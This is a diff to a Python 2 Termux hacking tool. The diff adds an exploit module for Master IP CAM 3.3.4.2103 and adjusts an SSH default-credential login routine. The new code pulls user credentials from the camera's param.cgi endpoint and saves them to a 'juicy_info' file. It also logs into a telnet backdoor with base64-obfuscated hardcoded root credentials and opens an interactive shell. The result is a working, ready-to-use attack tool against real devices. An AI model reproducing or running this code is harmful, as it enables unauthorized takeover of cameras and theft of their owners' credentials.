@@ -1,8 +1,8 @@
 #!/data/data/com.termux/files/usr/bin/python2
 # -*- coding: utf-8 -*-
 
-import sys, socket, os, time, base64, getpass
-
+import sys, socket, os, time, telnetlib
+from base64 import b64decode as xxxx
 sys.path.append('/data/data/com.termux/files/usr/share/txtool/core')
 from fungsi import warna, IP, ipv4, finish_exploit, ssh_shell, txtool_dir
 import sub_menu4 as BACK
@@ -58,7 +58,7 @@ Writen in python by Kuburan
     print("\n\t[" + warna.hijau + "1" + warna.tutup + "]" + warna.abuabu + "  Denial Of Service" + warna.tutup)
     print("\t[" + warna.hijau + "2" + warna.tutup + "]" + warna.abuabu + "  Information Disclosure" + warna.tutup)
     print("\t[" + warna.hijau + "0" + warna.tutup + "]" + warna.abuabu + "  Back" + warna.tutup)
-    choise = raw_input(warna.biru + "\n[+]" + warna.tutup + " Chose an action" + warna.kuning + "  >>  " + warna.tutup)
+    choise = raw_input(warna.biru + "\n[+]" + warna.tutup + " Select An action" + warna.kuning + "  >>  " + warna.tutup)
     if choise == '':
         empty()
         BACK.menu['menu_utama']()
@@ -360,7 +360,7 @@ def exploit3():
             BACK.menu['menu_utama']()
 
         if not true_ip:
-            print(warna.merah + "\n[x] " + warna.tutup + "Wrong ip adress")
+            print(warna.merah + "\n[x] " + warna.tutup + "incorrect IP address")
             BACK.menu['menu_utama']()
 
         port = '9000'
@@ -396,18 +396,22 @@ def exploit3():
 
     except requests.exceptions.HTTPError as error_1:
         print warna.merah + "\n[x]" + warna.tutup + " Http Error : ", error_1
+        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
         BACK.menu['menu_utama']()
 
     except requests.exceptions.ConnectionError as error_2:
         print warna.merah + "\n[x]" + warna.tutup + " Error Connecting : ", error_2
+        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
         BACK.menu['menu_utama']()
 
     except requests.exceptions.Timeout as error_3:
         print warna.merah + "\n[x]" + warna.tutup + " Timeout Error : ", error_3
+        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
         BACK.menu['menu_utama']()
 
     except requests.exceptions.RequestException as err:
         print warna.merah + "\n[x]" + warna.tutup, err
+        raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
         BACK.menu['menu_utama']()
 
 def exploit4():
@@ -415,6 +419,7 @@ def exploit4():
         import paramiko
     except ImportError:
         print(warna.merah + "\n[x] " + warna.tutup + "Error, please install paramiko module. ($ pip2 install paramiko)\n")
+        sys.exit()
 
     from paramiko.ssh_exception import BadHostKeyException, AuthenticationException, SSHException
 
@@ -429,8 +434,8 @@ def exploit4():
     _user = ["""root""",
              """mom"""]
     _connection = None
-    p = ["""$1$CGgdGXXG$0FmyyKMzcHgkKnUTZi5r./""",
-         """videoflow"""]
+    p = ["""videoflow""",
+         """$1$CGgdGXXG$0FmyyKMzcHgkKnUTZi5r./"""]
     _passwords = [line.strip() for line in p]
     _username = [line.strip() for line in _user]
     _retries = range(len(_passwords and _username))
@@ -440,10 +445,10 @@ def exploit4():
         BACK.menu['menu_utama']()
 
     if not true_ip:
-        print(warna.merah + "\n[x] " + warna.tutup + "Wrong ip adress")
+        print(warna.merah + "\n[x] " + warna.tutup + "incorrect IP address")
         BACK.menu['menu_utama']()
 
-    print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login")
+    print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login...")
     for _pass in _passwords:
         for _u in _username:
             try:
@@ -470,12 +475,123 @@ def exploit4():
     raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
     BACK.menu['menu_utama']()
 
-#    with requests.Session() as s:
-#        url = ("http://%s/login.html" % (target))
-#        header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'}
-#        payload = {'Content-Type': 'text/html;charset=UTF-8',
-#                   'Action': '%s/index.html' % (target), 'Class': "Login",
-#                   'username': 'dancok', 'password' : 'dancok'}
-#        send = s.post(url, headers=header, data=payload, timeout=10)
-#        print send.status_code
-#        print send.content
+def exploit5():
+    try:
+        from bs4 import BeautifulSoup
+
+    except ImportError:
+        print(warna.merah + "\n[x] " + warna.tutup + "Error, please install bs4 module. ($ pip2 install bs4)\n")
+        sys.exit()
+
+    IP()
+    print(warna.kuning + "\n[!]" + warna.tutup + " Vendor: Master IP CAM" + warna.tutup)
+    print(warna.kuning + "[!]" + warna.tutup + " Affected Version: 3.3.4.2103" + warna.tutup)
+    print("\n\t[" + warna.hijau + "1" + warna.tutup + "]" + warna.abuabu + " Sensitive Information Disclousure" + warna.tutup)
+    print("\t[" + warna.hijau + "2" + warna.tutup + "]" + warna.abuabu + " telnet Backdoor Access" + warna.tutup)
+    print("\t[" + warna.hijau + "0" + warna.tutup + "]" + warna.abuabu + " Back" + warna.tutup)
+    select = raw_input(warna.biru + "\n[+]" + warna.tutup + " Select An action" + warna.kuning + "  >>  " + warna.tutup)
+    if select == '':
+        empty()
+        BACK.menu['menu_utama']()
+
+    if select == '1':
+        try:
+            print(warna.kuning + "\n[!]" + warna.tutup + " Host or ip address" + warna.tutup)
+            t = raw_input(warna.biru + "[+]" + warna.tutup + " Target" + warna.kuning + "  >>  " + warna.tutup)
+            if t == '':
+                empty()
+                BACK.menu['menu_utama']()
+
+            print(warna.hijau + "\n[*] " + warna.tutup + "trying to collect sensitive information...")
+            time.sleep(1)
+            url = "http://%s/web/cgi-bin/hi3510/param.cgi?cmd=getuser" % (t)
+            header = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36'}
+            req = requests.get(url, headers=header, timeout=10)
+            req.raise_for_status()
+            soup = BeautifulSoup(req.content, "html.parser")
+            for script in soup(["script", "style"]):
+                script.decompose()
+            text = soup.get_text()
+            lines = (line.strip() for line in text.splitlines())
+            chunks = (phrase.strip("var" ";") for line in lines for phrase in line.split(" var "))
+            text = '\n'.join(chunk for chunk in chunks if chunk)
+            clear_text = text.encode(sys.stdout.encoding)
+            print(clear_text)
+            os.system("""mkdir -p %s/%s""" % (txtool_dir, t))
+            f = open(txtool_dir + "/%s/juicy_info.txt" % (t), "w")
+            f.write(clear_text + "\nLogin page : http://%s/web/index.html\n" % (t))
+            f.close()
+            print(warna.hijau + "[*] " + warna.tutup + "Login page : http://%s/web/index.html" % (t))
+            print(warna.hijau + "\n[*] " + warna.tutup + "sensitive information has been saved to ~/.txtool/%s/juicy_info.txt" % (t))
+            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+        except requests.exceptions.RequestException as er:
+            print warna.merah + "\n[x] " + warna.tutup + "An error occured:" ,er
+            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+        except requests.exceptions.HTTPError as er_1:
+            print warna.merah + "\n[x]" + warna.tutup + " Http Error : ", er_1
+            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+        except requests.exceptions.ConnectionError as er_2:
+            print warna.merah + "\n[x]" + warna.tutup + " Error Connecting : ", er_2
+            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+        except requests.exceptions.Timeout as er_3:
+            print warna.merah + "\n[x]" + warna.tutup + " Timeout Error : ", er_3
+            raw_input(" press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+    if select == '2':
+        print(warna.kuning + "\n[!]" + warna.tutup + " Host or ip address" + warna.tutup)
+        _host = raw_input(warna.biru + "[+]" + warna.tutup + " Target" + warna.kuning + "  >>  " + warna.tutup)
+        if _host == '':
+            empty()
+            BACK.menu['menu_utama']()
+
+        print(warna.hijau + "\n[*] " + warna.tutup + "Trying to login...")
+        time.sleep(1)
+        try:
+            _user = xxxx(b'cm9vdA==')
+            _password = xxxx(b'Y2F0MTAyOQ==')
+            tel_conn = telnetlib.Telnet(_host)
+            tel_conn.expect(["RT-IPC login: "], 10)
+            tel_conn.write(_user + "\n")
+            tel_conn.expect(["Password: ", "password"], 10)
+            tel_conn.write(_password + "\n")
+            (i, obj, res) = tel_conn.expect(["Incorrect", "incorrect"], 10)
+            if i != -1:
+                print(warna.merah + "\n[x]" + warna.tutup + " login failed")
+                raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+                BACK.menu['menu_utama']()
+
+            else:
+                if any(map(lambda x: x in res, ["#", "$", ">"])):
+                    print(warna.hijau + "\n[*] " + warna.tutup + "shell has been successfully opened")
+                    tel_conn.write("\n")
+                    tel_conn.interact()
+                    print(warna.merah + "\n[x]" + warna.tutup + " shell closed")
+                    tel_conn.close()
+                    raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue")
+                    BACK.menu['menu_utama']()
+
+        except socket.error as a:
+            print warna.merah + "\n[x] " + warna.tutup + "socket error : ", a
+            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+        except socket.timeout as b:
+            print warna.merah + "\n[x] " + warna.tutup + "socket timeout : ", b
+            raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue ")
+            BACK.menu['menu_utama']()
+
+    elif select == '0':
+        BACK.menu['menu_utama']()
+
+    else:
+        print warna.merah + "\n[x] " + warna.tutup + "Wrong command."
+        BACK.menu['menu_utama']()
